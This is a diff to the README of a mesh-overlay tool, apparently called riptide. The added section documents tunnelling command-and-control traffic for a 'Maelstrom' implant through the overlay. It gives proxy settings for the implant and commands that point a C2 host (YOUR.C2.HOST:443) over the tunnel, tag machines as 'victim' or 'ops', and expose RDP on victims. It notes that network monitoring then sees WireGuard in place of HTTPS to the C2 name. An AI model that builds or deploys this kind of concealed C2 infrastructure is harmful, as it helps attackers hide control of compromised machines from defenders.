@@ -58,6 +58,8 @@ python3 mesh.py status --out ./riptide-out
 python3 mesh.py gui --out ./riptide-out          # enroll UI 127.0.0.1:7667
 python3 mesh.py user add --out ./riptide-out --name DonMorpheus --role admin
 python3 mesh.py user add --out ./riptide-out --name operator --role operator
+python3 mesh.py c2 --out ./riptide-out --host YOUR.C2.HOST:443
+python3 mesh.py set --out ./riptide-out --name kali --tag ops
 ```
 
 `riptide-out/mesh.key` and `riptide-out/mesh.json` never go in git. Backup the key separately.
@@ -124,7 +126,46 @@ Windows (agent already running): `deploy/windows-connect.ps1` → Edge `http://1
 
 Userspace netstack does not put `10.66` on the host stack. The agent therefore listens `127.0.0.1:7668` and splices TCP onto `10.66.0.1:7668`. That is Connect. Havoc WSS `:443` stays a separate product.
 
-GUI: **entry** (hub you join on UDP 51820) next to **exit** (peer whose SOCKS you send traffic through). Country flags come from the peer WAN IP the hub sees in `wg show`. Click an exit → `ALL_PROXY=socks5h://10.66.0.X:1080`. Enroll (`mesh.py peer`) stays on the admin workstation that holds `mesh.key`.
+GUI: **entry** (hub you join on UDP 51820) next to **exit** (peer whose SOCKS you send traffic through). Country flags come from the peer WAN IP the hub sees in `wg show`. Click an exit → local SOCKS `127.0.0.1:1080` (agent chains onto that overlay exit). Enroll (`mesh.py peer`) stays on the admin workstation that holds `mesh.key`.
+
+## C2 through the mesh (Demon proxy)
+
+The mesh host is a **C2 proxy**, not a default-route VPN. User Chrome/Explorer on that box stay direct.
+
+Maelstrom payload / listener:
+
+```
+Proxy Enabled = true
+Proxy Type    = http
+Proxy Host    = 127.0.0.1
+Proxy Port    = 8080
+```
+
+`riptide-agent` (BOF service) already listening:
+
+- `127.0.0.1:8080` HTTP CONNECT — **only the implant** uses this
+- matching C2 host is spliced **over overlay UDP 51820** to `10.66.0.1:443` (hub nginx)
+- other CONNECT (if any) uses the host stack or the selected exit
+
+Same box: WAN shows WireGuard to the hub, not HTTPS to the C2 name. Other mesh peers can use this host as a redirector at overlay `:8080`. Bind `0.0.0.0:8080` only on an ops box you own (`HTTP=` in `[Riptide]`).
+
+```bash
+python3 mesh.py c2 --out ./riptide-out --host YOUR.C2.HOST:443 --via 10.66.0.1:443
+python3 mesh.py set --out ./riptide-out --name kali --tag ops --routes 192.168.0.0/24
+python3 mesh.py peer --out ./riptide-out --name windows --os windows --tag victim --serve 3389
+```
+
+Packed into `peers/*.conf` as `[Riptide]` (userspace agent only; keep it off `wg-quick` hub conf).
+
+Also on each peer:
+
+- local SOCKS `127.0.0.1:1080` + overlay SOCKS `:1080` (exit)
+- Connect GUI splice `:7668`
+- control `127.0.0.1:7670` (`POST /exit`) — GUI click sets it
+- `Serve` publishes overlay port → `127.0.0.1:port` (RDP etc.)
+- `Shields` on victims: overlay SOCKS/HTTP only from `tag=ops`
+- Magic names `name.rt` on hub UDP/53 overlay
+- session peers drop out of the operator roster when handshake dies
 
 On-box fallback (already root on the hub): `CONFIRM=YES templates/install-hub.sh /etc/wireguard/wg0.conf`.
 
